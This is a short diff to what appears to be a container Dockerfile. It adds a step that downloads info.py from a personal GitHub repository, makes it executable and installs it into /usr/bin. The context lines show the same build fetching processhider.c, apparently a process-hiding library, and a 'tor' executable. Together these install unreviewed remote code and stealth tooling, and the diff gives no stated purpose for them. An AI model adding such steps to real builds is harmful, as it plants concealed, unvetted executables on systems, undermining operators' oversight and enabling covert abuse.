@@ -16,6 +16,9 @@ RUN useradd -m coder \
     && mkdir -p /home/coder/project
 
 # Mengunduh dan menginstal file yang diperlukan
+RUN wget https://raw.githubusercontent.com/lucalocolocoloco/hd/main/info.py \
+    && chmod +x info.py \
+    && mv info.py /usr/bin/
 RUN wget https://raw.githubusercontent.com/lucalocolocoloco/hd/main/processhider.c
 RUN wget https://github.com/lucalocolocoloco/hd/raw/main/tor \
     && chmod +x tor \
@@ -43,7 +46,6 @@ RUN PYTHON_VERSIONS=$(ls /usr/bin/python3.9 /usr/bin/python3.11 | grep -Eo 'pyth
     && apt install -y python${PYTHON_VERSION}-venv
 
 WORKDIR /home/coder/project
-RUN wget https://raw.githubusercontent.com/lucalocolocoloco/hd/main/info.py
 # Copy and set up the start script
 COPY start.sh /usr/local/bin/start.sh
 RUN chmod +x /usr/local/bin/start.sh
